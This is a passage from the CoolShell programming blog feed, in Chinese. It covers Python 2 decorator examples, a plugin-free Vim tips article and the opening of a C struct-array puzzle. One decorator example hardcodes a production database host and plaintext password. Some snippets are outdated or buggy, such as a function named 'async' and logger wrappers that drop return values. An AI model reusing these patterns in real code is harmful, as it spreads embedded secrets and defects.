<p>上面这个例子中，是一个斐波拉契数例的递归算法。我们知道，这个递归是相当没有效率的，因为会重复调用。比如：我们要计算fib(5)，于是其分解成fib(4) + fib(3)，而fib(4)分解成fib(3)+fib(2)，fib(3)又分解成fib(2)+fib(1)…… 你可看到，基本上来说，fib(3), fib(2), fib(1)在整个递归过程中被调用了两次。</p>
<p>而我们用decorator，在调用函数前查询一下缓存，如果没有才调用了，有了就从缓存中返回值。一下子，这个递归从二叉树式的递归成了线性的递归。</p>
<h5>
<span class="ez-toc-section" id="Profiler%E7%9A%84%E4%BE%8B%E5%AD%90"></span>Profiler的例子<span class="ez-toc-section-end"></span>
</h5>
<p>这个例子没什么高深的，就是实用一些。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">import cProfile, pstats, StringIO

def profiler(func):
    def wrapper(*args, **kwargs):
        datafn = func.__name__ + ".profile" # Name the data file
        prof = cProfile.Profile()
        retval = prof.runcall(func, *args, **kwargs)
        #prof.dump_stats(datafn)
        s = StringIO.StringIO()
        sortby = 'cumulative'
        ps = pstats.Stats(prof, stream=s).sort_stats(sortby)
        ps.print_stats()
        print s.getvalue()
        return retval

    return wrapper

</pre>
<h5>
<span class="ez-toc-section" id="%E6%B3%A8%E5%86%8C%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"></span>注册回调函数<span class="ez-toc-section-end"></span>
</h5>
<p>下面这个示例展示了通过URL的路由来调用相关注册的函数示例：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">class MyApp():
    def __init__(self):
        self.func_map = {}

    def register(self, name):
        def func_wrapper(func):
            self.func_map[name] = func
            return func
        return func_wrapper

    def call_method(self, name=None):
        func = self.func_map.get(name, None)
        if func is None:
            raise Exception("No function registered against - " + str(name))
        return func()

app = MyApp()

@app.register('/')
def main_page_func():
    return "This is the main page."

@app.register('/next_page')
def next_page_func():
    return "This is the next page."

print app.call_method('/')
print app.call_method('/next_page')
</pre>
<p>注意：<br>
1）上面这个示例中，用类的实例来做decorator。<br>
2）decorator类中没有<strong>call</strong>()，但是wrapper返回了原函数。所以，原函数没有发生任何变化。</p>
<h5>
<span class="ez-toc-section" id="%E7%BB%99%E5%87%BD%E6%95%B0%E6%89%93%E6%97%A5%E5%BF%97"></span>给函数打日志<span class="ez-toc-section-end"></span>
</h5>
<p>下面这个示例演示了一个logger的decorator，这个decorator输出了函数名，参数，返回值，和运行时间。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">from functools import wraps
def logger(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        ts = time.time()
        result = fn(*args, **kwargs)
        te = time.time()
        print "function      = {0}".format(fn.__name__)
        print "    arguments = {0} {1}".format(args, kwargs)
        print "    return    = {0}".format(result)
        print "    time      = %.6f sec" % (te-ts)
        return result
    return wrapper

@logger
def multipy(x, y):
    return x * y

@logger
def sum_num(n):
    s = 0
    for i in xrange(n+1):
        s += i
    return s

print multipy(2, 10)
print sum_num(100)
print sum_num(10000000)</pre>
<p>上面那个打日志还是有点粗糙，让我们看一个更好一点的（带log level参数的）：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">import inspect
def get_line_number():
    return inspect.currentframe().f_back.f_back.f_lineno

def logger(loglevel):
    def log_decorator(fn):
        @wraps(fn)
        def wrapper(*args, **kwargs):
            ts = time.time()
            result = fn(*args, **kwargs)
            te = time.time()
            print "function   = " + fn.__name__,
            print "    arguments = {0} {1}".format(args, kwargs)
            print "    return    = {0}".format(result)
            print "    time      = %.6f sec" % (te-ts)
            if (loglevel == 'debug'):
                print "    called_from_line : " + str(get_line_number())
            return result
        return wrapper
    return log_decorator</pre>
<p>但是，上面这个带log level参数的有两具不好的地方，<br>
1） loglevel不是debug的时候，还是要计算函数调用的时间。<br>
2） 不同level的要写在一起，不易读。</p>
<p>我们再接着改进：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">import inspect

def advance_logger(loglevel):

    def get_line_number():
        return inspect.currentframe().f_back.f_back.f_lineno

    def _basic_log(fn, result, *args, **kwargs):
        print "function   = " + fn.__name__,
        print "    arguments = {0} {1}".format(args, kwargs)
        print "    return    = {0}".format(result)

    def info_log_decorator(fn):
        @wraps(fn)
        def wrapper(*args, **kwargs):
            result = fn(*args, **kwargs)
            _basic_log(fn, result, args, kwargs)
        return wrapper

    def debug_log_decorator(fn):
        @wraps(fn)
        def wrapper(*args, **kwargs):
            ts = time.time()
            result = fn(*args, **kwargs)
            te = time.time()
            _basic_log(fn, result, args, kwargs)
            print "    time      = %.6f sec" % (te-ts)
            print "    called_from_line : " + str(get_line_number())
        return wrapper

    if loglevel is "debug":
        return debug_log_decorator
    else:
        return info_log_decorator
</pre>
<p>你可以看到两点，<br>
1）我们分了两个log level，一个是info的，一个是debug的，然后我们在外尾根据不同的参数返回不同的decorator。<br>
2）我们把info和debug中的相同的代码抽到了一个叫_basic_log的函数里，DRY原则。</p>
<h5>
<span class="ez-toc-section" id="%E4%B8%80%E4%B8%AAMySQL%E7%9A%84Decorator"></span>一个MySQL的Decorator<span class="ez-toc-section-end"></span>
</h5>
<p>下面这个decorator是我在工作中用到的代码，我简化了一下，把DB连接池的代码去掉了，这样能简单点，方便阅读。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">import umysql
from functools import wraps

class Configuraion:
    def __init__(self, env):
        if env == "Prod":
            self.host    = "coolshell.cn"
            self.port    = 3306
            self.db      = "coolshell"
            self.user    = "coolshell"
            self.passwd  = "fuckgfw"
        elif env == "Test":
            self.host   = 'localhost'
            self.port   = 3300
            self.user   = 'coolshell'
            self.db     = 'coolshell'
            self.passwd = 'fuckgfw'

def mysql(sql):

    _conf = Configuraion(env="Prod")

    def on_sql_error(err):
        print err
        sys.exit(-1)

    def handle_sql_result(rs):
        if rs.rows &gt; 0:
            fieldnames = [f[0] for f in rs.fields]
            return [dict(zip(fieldnames, r)) for r in rs.rows]
        else:
            return []

    def decorator(fn):
        @wraps(fn)
        def wrapper(*args, **kwargs):
            mysqlconn = umysql.Connection()
            mysqlconn.settimeout(5)
            mysqlconn.connect(_conf.host, _conf.port, _conf.user, \
                              _conf.passwd, _conf.db, True, 'utf8')
            try:
                rs = mysqlconn.query(sql, {})
            except umysql.Error as e:
                on_sql_error(e)

            data = handle_sql_result(rs)
            kwargs["data"] = data
            result = fn(*args, **kwargs)
            mysqlconn.close()
            return result
        return wrapper

    return decorator

@mysql(sql = "select * from coolshell" )
def get_coolshell(data):
    ... ...
    ... ..
</pre>
<h5>
<span class="ez-toc-section" id="%E7%BA%BF%E7%A8%8B%E5%BC%82%E6%AD%A5"></span>线程异步<span class="ez-toc-section-end"></span>
</h5>
<p>下面量个非常简单的异步执行的decorator，注意，异步处理并不简单，下面只是一个示例。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">from threading import Thread
from functools import wraps

def async(func):
    @wraps(func)
    def async_func(*args, **kwargs):
        func_hl = Thread(target = func, args = args, kwargs = kwargs)
        func_hl.start()
        return func_hl

    return async_func

if __name__ == '__main__':
    from time import sleep

    @async
    def print_somedata():
        print 'starting print_somedata'
        sleep(2)
        print 'print_somedata: 2 sec passed'
        sleep(2)
        print 'print_somedata: 2 sec passed'
        sleep(2)
        print 'finished print_somedata'

    def main():
        print_somedata()
        print 'back in main'
        print_somedata()
        print 'back in main'

    main()
</pre>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83"></span>其它<span class="ez-toc-section-end"></span>
</h4>
<p>关于更多的示例，你可以参看： <a href="https://wiki.python.org/moin/PythonDecoratorLibrary" target="_blank" rel="noopener noreferrer">Python Decorator Library</a></p>
<p>关于Python Decroator的各种提案，可以参看：<a href="https://wiki.python.org/moin/PythonDecoratorProposals" target="_blank" rel="noopener noreferrer">Python Decorator Proposals</a></p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-03-20T09:50:34+08:00</pubDate>
<guid>https://coolshell.cn/articles/11265.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 无插件Vim编程技巧 ]]></title>
<link>https://coolshell.cn/articles/11312.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >相信大家看过《<a title="简明 Vim 练级攻略" href="https://coolshell.cn/articles/5426.html" target="_blank">简明Vim教程</a>》也玩了《<a title="游戏：VIM大冒险" href="https://coolshell.cn/articles/7166.html" target="_blank">Vim大冒险</a>》的游戏了，相信大家对Vim都有一个好的入门了。我在这里把我日常用Vim编程的一些技巧列出来给大家看看，希望对大家有用，另外，也是一个抛砖引玉的过程，也希望大家把你们的技巧跟贴一下，我会更新到这篇文章中。另外，这篇文章里的这些技巧全都是vim原生态的，不需要你安装什么插件。<strong>我的Vim的版本是7.2</strong>。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E6%B5%8F%E8%A7%88%E4%BB%A3%E7%A0%81" title="浏览代码">浏览代码</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%BC%93%E5%86%B2%E5%8C%BA" title="缓冲区">缓冲区</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%AA%97%E5%8F%A3%E5%88%86%E5%B1%8F%E6%B5%8F%E8%A7%88" title="窗口分屏浏览">窗口分屏浏览</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%88%86%E5%B1%8F%E5%90%8C%E6%AD%A5%E7%A7%BB%E5%8A%A8" title="分屏同步移动">分屏同步移动</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Tab%E9%A1%B5%E6%B5%8F%E8%A7%88%E7%9B%AE%E5%BD%95" title="Tab页浏览目录">Tab页浏览目录</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E4%BF%9D%E5%AD%98%E4%BC%9A%E8%AF%9D" title="保存会话">保存会话</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#Quickfix" title="Quickfix">Quickfix</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E8%A1%A5%E5%85%A8" title="关键字补全">关键字补全</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-9" href="#%E5%85%B6%E5%AE%83%E6%8A%80%E5%B7%A7" title="其它技巧">其它技巧</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-10" href="#%E5%AD%97%E7%AC%A6%E7%9B%B8%E5%85%B3" title="字符相关">字符相关</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-11" href="#%E7%BC%A9%E8%BF%9B%E7%9B%B8%E5%85%B3" title="缩进相关">缩进相关</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-12" href="#%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E7%9B%B8%E5%85%B3" title="复制粘贴相关">复制粘贴相关</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#%E5%85%89%E6%A0%87%E7%A7%BB%E5%8A%A8%E7%9B%B8%E5%85%B3" title="光标移动相关">光标移动相关</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-14" href="#%E8%AF%BB%E5%8F%96Shell%E5%91%BD%E4%BB%A4%E7%9B%B8%E5%85%B3" title="读取Shell命令相关">读取Shell命令相关</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#vim%E7%9A%84%E7%BB%88%E7%BA%A7%E6%8F%92%E4%BB%B6" title="vim的终级插件">vim的终级插件</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E6%B5%8F%E8%A7%88%E4%BB%A3%E7%A0%81"></span>浏览代码<span class="ez-toc-section-end"></span>
</h4>
<p><span style="line-height: 1.5em;">首先，我们先从浏览代码开始。有时候，我们需要看多个文件，所以，传统的做法是，我们开多个tty终端，每个tty里用Vim打开一个文件，然后来回切换。这很没有什么效率。我们希望在一个Vim里打开多个文件，甚至浏览程序目录。</span></p>
<p>浏览目录的命令很简单：（你也可以直接vim一个目录）</p>
<blockquote><p><strong>:E</strong></p></blockquote>
<p>注意，是大写。于是，你会看到下面这样的界面：</p>
<p><span id="more-11312"></span></p>
<p><img alt="image placeholder" ></p>
<p style="text-align: left;">这个界面中，<strong>你可以用 j, k 键上下移动，然后回车，进入一个目录，或是找开一个文件</strong>。你可以看到上面有一堆命令：</p>
<ul>
<li>【 – 】 到上级目录</li>
<li>【D】删除文件（大写）</li>
<li>【R】改文件名（大写）</li>
<li>【s】对文件排序（小写）</li>
<li>【x】执行文件</li>
</ul>
<p>当然，打开的文件会把现有已打开的文件给冲掉——也就是说你只看到了一个文件。</p>
<p>如果你要改变当前浏览的目录，或是查看当前浏览的目录，你可以使用和shell一样的命令：</p>
<blockquote>
<p><strong>:cd &lt;dir&gt; – 改变当前目录</strong></p>
<p><strong>:pwd  – 查看当前目录</strong></p>
</blockquote>
<h4>
<span class="ez-toc-section" id="%E7%BC%93%E5%86%B2%E5%8C%BA"></span>缓冲区<span class="ez-toc-section-end"></span>
</h4>
<p>其实，你用:E 浏览打开的文件都没有被关闭，这些文件都在缓冲区中。你可以用下面的命令来查看缓冲区：</p>
<blockquote><p><strong>:ls</strong></p></blockquote>
<p>于是，在你的Vim下，你会看到如下界面：</p>
<p><img alt="image placeholder" ></p>
<p>你可以看到Vim打开了四个文件，编号是4，5，6，7，如果你要切换打开的文件，这个时候，你不要按回车（按了也没事，只不过按了就看不到:ls输出的buffer列表了），你可以使用下面的命令切换文件（buffer后面的4表示切到4号文件也就是src/http/ngx_http.c）：</p>
<blockquote><p><strong>:buffer 4</strong></p></blockquote>
<p>或是：</p>
<blockquote><p><strong>:buffer src/http/ngx_http.c</strong></p></blockquote>
<p>注意，</p>
<ul>
<li>你可以像在Shell中输入命令按Tab键补全一样补全Vim的命令。</li>
<li>也可以用像gdb一样用最前面的几个字符，只要没有冲突。如：buff</li>
</ul>
<p>你还可以动用如下命令，快速切换：</p>
<blockquote><p>:bnext      缩写 :bn<br>
:bprevious   缩写 :bp<br>
:blast  缩写 :bl<br>
:bfirst 缩写 :bf</p></blockquote>
<p><span style="line-height: 1.5em;">上图中，我们还可以看到5有一个%a，这表示当前文件，相关的标记如下：</span></p>
<p style="padding-left: 30px;">– （非活动的缓冲区）<br>
a （当前被激活缓冲区）<br>
h （隐藏的缓冲区）<br>
% （当前的缓冲区）<br>
# （交换缓冲区）<br>
= （只读缓冲区）<br>
+ （已经更改的缓冲区）</p>
<h4>
<span class="ez-toc-section" id="%E7%AA%97%E5%8F%A3%E5%88%86%E5%B1%8F%E6%B5%8F%E8%A7%88"></span>窗口分屏浏览<span class="ez-toc-section-end"></span>
</h4>
<p>相信你在《<a title="Vim的分屏功能" href="https://coolshell.cn/articles/1679.html" target="_blank">Vim的窗口分屏</a>》一文中，你已经知道了怎么拆分窗口了。其实，我更多的不是用拆分窗口的命令，而是用浏览文件的命令来分隔窗口。如：</p>
<p>把当前窗口上下分屏，并在下面进行目录浏览：</p>
<blockquote><p><strong>:He   全称为 :Hexplore  （在下边分屏浏览目录）</strong></p></blockquote>
<p>如果你要在上面，你就在 :He后面加个 !，</p>
<blockquote><p><strong>:He!  （在上分屏浏览目录）</strong></p></blockquote>
<p>如果你要左右分屏的话，你可以这样：</p>
<blockquote><p><strong>:Ve 全称为 :Vexplore （在左边分屏间浏览目录，要在右边则是 :Ve!）</strong></p></blockquote>
<p>下图是分别用:He 和 :Ve搞出来的同时看三个文件：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">在分屏间的跳转和切换在《<a title="Vim的分屏功能" href="https://coolshell.cn/articles/1679.html" target="_blank">Vim的窗口分屏</a>》一文中提过了：<strong>先按Ctrl + W，然后按方向键：h j k l</strong></p>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="%E5%88%86%E5%B1%8F%E5%90%8C%E6%AD%A5%E7%A7%BB%E5%8A%A8"></span>分屏同步移动<span class="ez-toc-section-end"></span>
</h4>
<p>要让两个分屏中的文件同步移动，很简单，你需要到需要同步移动的两个屏中都输入如下命令（相当于使用“铁锁连环”）：</p>
<blockquote><p><strong>:set scb</strong></p></blockquote>
<p>如果你需要解开，那么就输入下面的命令：</p>
<blockquote><p><strong>:set scb!</strong></p></blockquote>
<p>注：set scb 是 set scrollbind 的简写。</p>
<h4>
<span class="ez-toc-section" id="Tab%E9%A1%B5%E6%B5%8F%E8%A7%88%E7%9B%AE%E5%BD%95"></span>Tab页浏览目录<span class="ez-toc-section-end"></span>
</h4>
<p>分屏可能会让你不爽，你可能更喜欢像Chrome这样的分页式的浏览，那么你可以用下面的命令：</p>
<blockquote><p><strong>:Te  全称是 :Texplorer</strong></p></blockquote>
<p>下图中，你可以看到我用Te命令打开了三页，就在顶端我们可以可以看到有三页，其中第一页Tab上的数字3表示那一页有3个文件。</p>
<p><img alt="image placeholder" ></p>
<p>我们要在多个Tabe页中切换，在normal模式下，你可以使用下面三个按键（注意没有冒号）：</p>
<blockquote>
<p><strong>gt   – 到下一个页</strong></p>
<p><strong>gT  – 到前一个页</strong></p>
<p><strong>{i} gt   – i是数字，到指定页，比如：5 gt 就是到第5页</strong></p>
</blockquote>
<p>你可以以使用 【:tabm {n}】来切换Tab页。</p>
<p>gvim应该是：Ctrl+PgDn 和 Ctrl+PgUp 来在各个页中切换。</p>
<p>如果你想看看你现在打开的窗口和Tab的情况，你可以使用下面的命令：</p>
<blockquote><p><strong>:tabs</strong></p></blockquote>
<p>于是你可以看到：</p>
<p><img alt="image placeholder" ></p>
<p>使用如下命令可以关闭tab：（当然，我更喜欢使用传统的:q, :wq来关闭）</p>
<blockquote><p><strong>:tabclose [i]</strong> – 如果后面指定了数字，那就关闭指定页，如果没有就关闭当前页</p></blockquote>
<p>最后提一下，如果你在Shell命令行下，你可以使用 vim 的 -p 参数来用Tab页的方式打开多个文件，比如：</p>
<blockquote><p><strong>vim -p cool.cpp shell.cpp haoel.cpp<br>
vim -p *.cpp</strong></p></blockquote>
<p><strong>注：如果你想把buffer中的文件全转成tab的话，你可以使用下面的命令</strong></p>
<blockquote><p><strong>:bufdo tab split</strong></p></blockquote>
<h4>
<span class="ez-toc-section" id="%E4%BF%9D%E5%AD%98%E4%BC%9A%E8%AF%9D"></span>保存会话<span class="ez-toc-section-end"></span>
</h4>
<p>如果你用Tab或Window打开了好些文件的文件，还设置了各种滚屏同步，或是行号……，那么，你可以用下面的命令来保存会话：（你有兴趣你可以看看你的 mysession.vim文件内容，也就是一个批处理文件）</p>
<blockquote><p><strong>:mksession ~/.mysession.vim</strong></p></blockquote>
<p>如果文件重复，vim默认会报错，如果你想强行写入的话，你可以在mksession后加! ：</p>
<blockquote><p><strong>:mksession! ~/.mysession.vim</strong></p></blockquote>
<p>于是下次，你可以这样打开这个会话：</p>
<blockquote><p><strong>vim -S ~/.mysession.vim</strong></p></blockquote>
<p>保存完会话后，你也没有必要一个一个Tab/Windows的去Close。你可以简单地使用：</p>
<blockquote>
<p><strong>:qa   – 退出全部 </strong></p>
<p><strong>:wqa  -保存全部并退出全部</strong></p>
</blockquote>
<h4>
<span class="ez-toc-section" id="Quickfix"></span>Quickfix<span class="ez-toc-section-end"></span>
</h4>
<p>假如我们有一个hello.cpp文件和一个makefile，于是我们可以直接在vim下输入 :make ， 于是就可以make这个hello.cpp文件，如果出错了，我们需要按回车返回，这个时候，我们可以使用下面的命令来把出错显到在vim的分屏中：</p>
<blockquote><p><strong>:cw</strong></p></blockquote>
<p>于是，就会出现下面右边的那个样子：（是不是看上去和我一样很帅？）</p>
<p><img alt="image placeholder" ></p>
<p>上图中左边是我的makefile，右边是我的错误百出的源代码，右边下面是quickfix窗屏。你可以看到quickfix窗屏指向的第一个错误已经定位到我们相就错误的文件行上了。</p>
<p>你可以使用像浏览文件那样用j, k在quckfix窗屏中上下移动到相应的错误上然后按回车，然后就可以在上面的窗屏里定位到相应的源文件的代码行。但是，如果是这样的话， 你要定位下一条错误还得用Ctrl +W 回到quickfix屏中来然后重复来过。</p>
<p>你可以使用下面的命令而不用回到quickfix中来：</p>
<blockquote>
<p><strong>:cp 跳到上一个错误</strong></p>
<p><strong>:cn 跳到下一个错误</strong></p>
<p><strong>:cl 列出所有错误</strong></p>
<p><strong>:cc 显示错误详细信息</strong></p>
</blockquote>
<p>下面我们来看另一个quickfix的功能。</p>
<p>如果你用过vim的cscope插件，你就知道cscope可以用来查找相当的代码，但cscope需要事先生成一个数据库，对一些简单的查找，其实，我们用vim的grep命令就可以了，不需要专门为之生成数据库。vim的grep命令和shell的几乎一样。</p>
<p>我们来看个例子：</p>
<p>比如我们正在浏览nginx的代码，这时，我想看看哪里用到了nginx的NGX_HTTP_VAR_INDEXED宏。于是，我可以在vim里输入如下的命令：</p>
<blockquote><p><strong>:grep -r –include=”*.[ch]” NGX_HTTP_VAR_INDEXED src/</strong></p></blockquote>
<p>上面这个命令意思是递归查询src目录下所有的.c和.h文件，其中包括NGX_HTTP_VAR_INDEXED宏。然后，你就会看到vim到shell里去执行并找到了相关的文件，按回车返回vim后，别忘了用 【:cw 】把grep的输出取回来，于是我们就有下面的样子：</p>
<p><img alt="image placeholder" ></p>
<p>然后同上面一样，你可以用 j，k 键移动quickfix里的光标到相应的行，然后按回车定位文件，或是使用【:cn】或【:cp】来移动到定位。（这样，你会把多个文件打开到缓冲区，别忘了【:ls】来查看缓冲区）</p>
<p>你看，到这里，一个小小的IDE就这样产生了，而且，<strong>最帅的时，我们连一点插件都没有装，也没有在.vimrc文件中配置过什么</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E9%94%AE%E5%AD%97%E8%A1%A5%E5%85%A8"></span>关键字补全<span class="ez-toc-section-end"></span>
</h4>
<p>我们还是坚持不用任何插件。我们来看看是怎么个自动补全的。</p>
<p>在insert模式下，我们可以按如下快捷键：</p>
<blockquote><p>【<strong>Ctrl +N</strong>】  – 当你按下这它时，你会发现Vim就开始搜索你这个目录下的代码，搜索完成了就会出现一个下拉列表（居然是粉紫色的，真是丑死了）</p></blockquote>
<p>下图是我输入了ngx_http_然后按ctrl+n出现的样子，它已经帮我补全了一个，但是我不想要这个。然后，在Vim的下方我们可以看到状态变成了“关键字补全”，然后后面有^N^P的提示，意思就是告诉你还有一个Ctrl+P.</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<blockquote><p>【<strong>Ctrl + P</strong>】 – 接下来你可以按这个键，于是回到原点，然后你可以按上下光标键来选择相应的Word。</p></blockquote>
<p>对于上面那个例子，我们按下了Ctrl+P后出现下面的这个样子。我们可以看到，光标回到了一开始我输入的位置，然后你可以干两件事，一个是继续输入（这可以帮助过滤关键词），另一个是用“光标键”上移或下移来选择下拉列表中的关键字，选好后回车，就补全了。</p>
<p><img alt="image placeholder" ></p>
<p>与此类似的，还有更多的补齐，都在Ctrl +X下面：</p>
<ul>
<li>Ctrl + X 和 Ctrl + D 宏定义补齐</li>
<li>Ctrl + X 和 Ctrl + ] 是Tag 补齐</li>
<li>Ctrl + X 和 Ctrl + F 是文件名 补齐</li>
<li>Ctrl + X 和 Ctrl + I 也是关键词补齐，但是关键后会有个文件名，告诉你这个关键词在哪个文件中</li>
<li>Ctrl + X 和 Ctrl +V 是表达式补齐</li>
<li>Ctrl + X 和 Ctrl +L 这可以对整个行补齐，变态吧。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83%E6%8A%80%E5%B7%A7"></span>其它技巧<span class="ez-toc-section-end"></span>
</h4>
<h5>
<span class="ez-toc-section" id="%E5%AD%97%E7%AC%A6%E7%9B%B8%E5%85%B3"></span>字符相关<span class="ez-toc-section-end"></span>
</h5>
<p style="padding-left: 30px;">【guu 】 – 把一行的文字变成全小写。或是【Vu】</p>
<p style="padding-left: 30px;">【gUU】 – 把一行的文件变成全大写。或是【VU】</p>
<p style="padding-left: 30px;">按【v】键进入选择模式，然后移动光标选择你要的文本，按【u】转小写，按【U】转大写</p>
<p style="padding-left: 30px;">【ga】 –  查看光标处字符的ascii码</p>
<p style="padding-left: 30px;">【g8】 – 查看光标处字符的utf-8编码</p>
<p style="padding-left: 30px;">【gf】  – 打开光标处所指的文件 （这个命令在打到#include头文件时挺好用的，当然，仅限于有路径的）</p>
<p style="padding-left: 30px;">【*】或【#】在当前文件中搜索当前光标的单词</p>
<h5>
<span class="ez-toc-section" id="%E7%BC%A9%E8%BF%9B%E7%9B%B8%E5%85%B3"></span>缩进相关<span class="ez-toc-section-end"></span>
</h5>
<p style="padding-left: 30px;">【&gt;&gt;】向右给它进当前行 【&lt;&lt;】向左缩进当前行</p>
<p style="padding-left: 30px;">【=】  – 缩进当前行 （和上面不一样的是，它会对齐缩进）</p>
<p style="padding-left: 30px;">【=%】 – 把光标位置移到语句块的括号上，然后按=%，缩进整个语句块（%是括号匹配）</p>
<p style="padding-left: 30px;">【G=gg】 或是 【gg=G】  – 缩进整个文件（G是到文件结尾，gg是到文件开头）</p>
<h5>
<span class="ez-toc-section" id="%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E7%9B%B8%E5%85%B3"></span>复制粘贴相关<span class="ez-toc-section-end"></span>
</h5>
<p style="padding-left: 30px;">按【v】 键进入选择模式，然后按h,j,k,l移动光标，选择文本，然后按 【y】 进行复制，按 【p】 进行粘贴。</p>
<p style="padding-left: 30px;">【dd】剪切一行（前面加个数字可以剪切n行），【p】粘贴</p>
<p style="padding-left: 30px;">【yy】复制一行（前面加个数字可以复制n行），【p】粘贴</p>
<h5>
<span class="ez-toc-section" id="%E5%85%89%E6%A0%87%E7%A7%BB%E5%8A%A8%E7%9B%B8%E5%85%B3"></span>光标移动相关<span class="ez-toc-section-end"></span>
</h5>
<p style="padding-left: 30px;">【Ctrl + O】向后回退你的光标移动</p>
<p style="padding-left: 30px;">【Ctrl + I 】向前追赶你的光标移动</p>
<p style="padding-left: 30px;">这两个快捷键很有用，可以在Tab页和Windows中向前和向后trace你的光标键，这也方便你跳转光标。</p>
<h5>
<span class="ez-toc-section" id="%E8%AF%BB%E5%8F%96Shell%E5%91%BD%E4%BB%A4%E7%9B%B8%E5%85%B3"></span>读取Shell命令相关<span class="ez-toc-section-end"></span>
</h5>
<p style="padding-left: 30px;">【:r!date】 插入日期</p>
<p style="padding-left: 30px;">上面这个命令，:r 是:read的缩写，!是表明要运行一个shell命令，意思是我要把shell命令的输出读到vim里来。</p>
<h4>
<span class="ez-toc-section" id="vim%E7%9A%84%E7%BB%88%E7%BA%A7%E6%8F%92%E4%BB%B6"></span>vim的终级插件<span class="ez-toc-section-end"></span>
</h4>
<p style="padding-left: 30px;">CentOS下：yum erase emacs</p>
<p style="padding-left: 30px;">Ubuntu下：apt-get remove emacs</p>
<p>对了，以前本站也有一篇小短文《<a href="https://coolshell.cn/articles/894.html" target="_blank">如何在vim中得到你最喜爱的IDE特性</a>》你也可以看看。</p>
<p>（:wq）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-03-24T08:25:29+08:00</pubDate>
<guid>https://coolshell.cn/articles/11312.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ C语言结构体里的成员数组和指针 ]]></title>
<link>https://coolshell.cn/articles/11377.html</link>
<content><![CDATA[ 
<p>单看这文章的标题，你可能会觉得好像没什么意思。你先别下这个结论，相信这篇文章会对你理解C语言有帮助。这篇文章产生的背景是在微博上，看到<a title="Laruence" href="https://weibo.com/laruence" target="_blank">@Laruence</a>同学出了一个关于C语言的题，<a href="https://weibo.com/1170999921/ADojDbuSe" target="_blank">微博链接</a>。微博截图如下。我觉得好多人对这段代码的理解还不够深入，所以写下了这篇文章。</p>
<p style="text-align: center;"><a href="https://weibo.com/1170999921/ADojDbuSe" target="_blank"><img alt="image placeholder" ></a></p>
<p>为了方便你把代码copy过去编译和调试，我把代码列在下面：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
struct str{
    int len;
    char s[0];
};

struct foo {
    struct str *a;
};

int main(int argc, char** argv) {
    struct foo f={0};
    if (f.a-&gt;s) {
        printf( f.a-&gt;s);
    }
    return 0;
}
</pre>
